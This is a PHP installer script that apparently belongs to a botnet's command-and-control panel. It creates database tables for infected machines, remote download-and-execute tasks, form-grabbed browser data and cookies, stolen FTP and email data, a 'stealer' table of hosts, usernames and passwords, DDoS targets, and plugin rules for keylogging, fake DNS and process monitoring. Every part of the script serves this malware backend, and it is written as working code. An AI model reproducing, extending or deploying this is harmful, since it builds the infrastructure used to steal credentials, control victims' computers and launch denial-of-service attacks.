<?php

require_once "./inc/cfg.php";
require_once "./inc/funcs.php";

global $dbcon;
mysql_init();

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `bots`")) die('Check DB settings, error in "bots" table #1');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `bots` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `ip` VARCHAR(16) NOT NULL,
  `proxyip` VARCHAR(16) NOT NULL,
  `comp` VARCHAR(16) NOT NULL,
  `os` TINYINT NOT NULL,
  `country` VARCHAR(4) NOT NULL,
  `time` INT NOT NULL,
  `cname` VARCHAR(40) NOT NULL,
  `upd` TINYINT NOT NULL DEFAULT '0',
  `seller` VARCHAR(5) NOT NULL,
  `bits` TINYINT NOT NULL,
  `installed` TINYINT NOT NULL DEFAULT '0',
  `personal` TINYINT NOT NULL DEFAULT '0',
  `delete` TINYINT NOT NULL DEFAULT '0',
  `privs` TINYINT NOT NULL,
  `fsearch` TINYINT NOT NULL DEFAULT '0',
  `ddos` TINYINT NOT NULL DEFAULT '0',
  `ltaskid` INT NOT NULL DEFAULT '0',
  `ban` TINYINT NOT NULL DEFAULT '0',
  `hget` TINYINT NOT NULL DEFAULT '0',
  `hid` VARCHAR(20) NOT NULL DEFAULT '',
  `hpass` VARCHAR(5) NOT NULL DEFAULT '',
  `htime` INT NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `cname` (`cname`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1")) die('Check DB settings, error in "bots" table #2');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `tasks`")) die('Check DB settings, error in "tasks" table #3');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `tasks` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `seller` VARCHAR(5) NOT NULL,
  `comment` VARCHAR(255) NOT NULL,
  `from` VARCHAR(255) NOT NULL,
  `loads` INT NOT NULL,
  `runs` INT NOT NULL,
  `limit` INT NOT NULL,
  `country` TEXT NOT NULL,
  `time` INT NOT NULL,
  `stop` ENUM('0','1') DEFAULT '0',
  `isdll` ENUM('0','1','2','3','4') DEFAULT '0',
  `bits` ENUM('0','1','2') NOT NULL DEFAULT '0',
  `delafter` ENUM('0','1') NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1")) die('Check DB settings, error in "tasks" table #4');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `personal`")) die('Check DB settings, error in "personal" table #5');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `personal` (
  `botid` INT NOT NULL,
  `task` VARCHAR(255) NOT NULL,
  `isdll` ENUM('0','1','2','3') DEFAULT '0',
  UNIQUE KEY `botid` (`botid`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251")) die('Check DB settings, error in "personal" table #6');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `formgrab`")) die('Check DB settings, error in "formgrab" table #7');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `formgrab` (
  `cname` VARCHAR(40) NOT NULL,
  `browser` VARCHAR(255) NOT NULL,
  `url` VARCHAR(255) NOT NULL,
  `data` TEXT NOT NULL,
  `cookies` TEXT NOT NULL,
  `uagent` VARCHAR(255) NOT NULL,
  `time` INT NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251")) die('Check DB settings, error in "formgrab" table #8');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `ftpgrab`")) die('Check DB settings, error in "ftpgrab" table #9');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `ftpgrab` (
  `data` VARCHAR(255) NOT NULL,
  UNIQUE KEY `data` (`data`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251")) die('Check DB settings, error in "ftpgrab" table #10');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `options`")) die('Check DB settings, error in "options" table #11');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `options` (
  `status` VARCHAR(5) NOT NULL,
  `upd` VARCHAR(255) NOT NULL,
  `bot_search` LONGTEXT NOT NULL,
  `forms_search` LONGTEXT NOT NULL
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251")
) die('Check DB settings, error in "update" table #12');
else if (!mysqli_query($dbcon,"INSERT INTO `options` VALUES ('none','','','')")) die('Check DB settings, error in "options" insert #13');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `plugins`")) die('Check DB settings, error in "plugins" table #14');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `plugins` (
  `hash` VARCHAR(30) NOT NULL,
  `fgfilter` TEXT NOT NULL,
  `fakedns_rules` TEXT NOT NULL,
  `filesearch_rules` TEXT NOT NULL,
  `procmon_rules` TEXT NOT NULL,
  `ddos_rules` TEXT NOT NULL,
  `keylog_rules` TEXT NOT NULL,
  `fgcookies` TINYINT NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=cp1251")) die('Check DB settings, error in "plugins" table #15');
else if (!mysqli_query($dbcon,"INSERT INTO `plugins` VALUES ('','','','','','','',0)")) die('Check DB settings, error in "plugins" insert #16');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `procmon`")) die('Check DB settings, error in "procmon" table #17');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `procmon` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `process` VARCHAR(255) NOT NULL,
  `type` ENUM('0','1','2') NOT NULL DEFAULT '0',
  `time` INT NOT NULL,
  `success` INT NOT NULL,
  `stop` ENUM('0','1') DEFAULT '0',
  `url` VARCHAR(255) NOT NULL,
  `comment` VARCHAR(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `process` (`process`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1")) die('Check DB settings, error in "procmon" table #18');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `ddos`")) die('Check DB settings, error in "ddos" table #19');
if (!mysqli_query($dbcon,"CREATE TABLE `ddos` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `mode` TINYINT NOT NULL,
  `url` VARCHAR(255) NOT NULL,
  `state` TINYINT NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1")) die('Check DB settings, error in "ddos" table #20');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `emailgrab`")) die('Check DB settings, error in "emailgrab" table #21');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `emailgrab` (
  `data` VARCHAR(255) NOT NULL,
  UNIQUE KEY `data` (`data`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251")) die('Check DB settings, error in "emailgrab" table #22');

if (!mysqli_query($dbcon,"DROP TABLE IF EXISTS `stealer`")) die('Check DB settings, error in "stealer" table #23');
if (!mysqli_query($dbcon,"CREATE TABLE IF NOT EXISTS `stealer` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `cname` VARCHAR(40) NOT NULL,
  `softid` TINYINT NOT NULL,
  `host` VARCHAR(255) NOT NULL,
  `user` VARCHAR(255) NOT NULL,
  `pass` MEDIUMTEXT NOT NULL,
  `time` INT NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251")) die('Check DB settings, error in "stealer" table #24');

if (!mysqli_query($dbcon,"UPDATE `options` SET `status`='done'")) die('Check DB settings, error in "options" table #25');

echo 'DB created without errors';

echo'<meta http-equiv=REFRESH CONTENT="0;URL='.$config["cpname"].'">';

?>